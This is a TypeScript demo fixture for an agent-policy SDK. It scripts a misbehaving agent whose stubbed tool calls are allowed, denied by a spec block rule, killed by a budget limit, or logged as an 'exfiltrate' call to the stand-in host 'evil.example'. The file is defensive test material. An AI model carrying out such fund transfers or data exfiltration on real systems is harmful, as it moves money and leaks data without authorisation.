// Shared scripted agent session for the tamper + silence demos. Deterministic
// in structure (5 decisions, same order every run), self-contained: no network,
// no model, no .vendor — only the committed SDK under src/.
//
// The session walks an agent through the four decision kinds that matter:
//   1. lookup_customer  → ALLOW   (a benign read)
//   2. transfer_funds   → DENY    (blocked by a spec deny rule)
//   3. generate_report  → ALLOW   (spends the run budget)
//   4. generate_report  → KILL    (budget kill — the runaway second call)
//   5. exfiltrate       → DENY    (attempted AFTER the kill — logged, not run)
import { fileURLToPath } from "node:url";
import { harden } from "../../src/experimental/harden.js";
import { generateKeyPair, privateKeyToPem, publicKeyToPem } from "../../src/kernel/sign.js";
import type { AgentMintConfig, AgentMintSpec, DecisionReceipt } from "../../src/types.js";

export interface DemoSession {
  receipts: DecisionReceipt[];
  publicKeyPem: string;
  privateKeyPem: string;
  keyId: string;
  specHash: string | undefined;
  verify: ReturnType<typeof harden>["__verifyReceipts"];
}

/** The tool the agent is trying to abuse via a denied transfer. */
const spec: AgentMintSpec = {
  version: "1.0",
  // A bare `action: block` on a tool is a spec deny rule: the call is refused.
  tools: { transfer_funds: { action: "block" } },
};

const ok = async () => ({ ok: true });

export async function runDemoSession(): Promise<DemoSession> {
  const { publicKey, privateKey } = generateKeyPair();
  const privateKeyPem = privateKeyToPem(privateKey);
  const publicKeyPem = publicKeyToPem(publicKey);

  const config: AgentMintConfig = {
    spec,
    budget: 1,
    // Only the report tool costs anything; the first call spends the whole
    // budget so the second call trips the kill.
    costEstimator: (tool) => (tool === "generate_report" ? 1 : 0),
    signing: { privateKeyPem },
  };

  const tools = harden(
    {
      lookup_customer: ok,
      transfer_funds: ok,
      generate_report: ok,
      exfiltrate: ok,
    },
    config,
  );

  await tools.lookup_customer({ id: "CUST-42" }); // ALLOW
  await tools.transfer_funds({ amount: 5000, to: "acct-999" }); // DENY (spec)
  await tools.generate_report({ range: "2026-Q2" }); // ALLOW (spends budget)
  await tools.generate_report({ range: "2026-Q2" }); // KILL (budget)
  await tools.exfiltrate({ dest: "evil.example", blob: "..." }); // DENY (after kill)

  const receipts = tools.__receipts();
  return {
    receipts,
    publicKeyPem,
    privateKeyPem,
    keyId: receipts[0]?.key_id ?? "",
    specHash: receipts[0]?.spec_hash,
    verify: tools.__verifyReceipts,
  };
}

/** verdict column: ALLOW when in policy, DENY otherwise. */
export function verdict(r: DecisionReceipt): string {
  return r.in_policy ? "ALLOW" : "DENY ";
}

/** Format one receipt as: `seq  ALLOW/DENY  action  reason`. */
export function receiptLine(r: DecisionReceipt): string {
  return `  ${String(r.seq).padEnd(3)}  ${verdict(r)}  ${r.action.padEnd(16)}  ${r.policy_reason}`;
}

// This module is the shared fixture behind the tamper + silence demos. Run it
// directly to print the scripted session on its own — non-interactive, no stdin.
if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  runDemoSession().then((s) => {
    console.log("\n  Scripted agent session (shared by the tamper + silence demos):\n");
    for (const r of s.receipts) console.log(receiptLine(r));
    console.log(`\n  Chain verifies: ${JSON.stringify(s.verify())}\n`);
  });
}
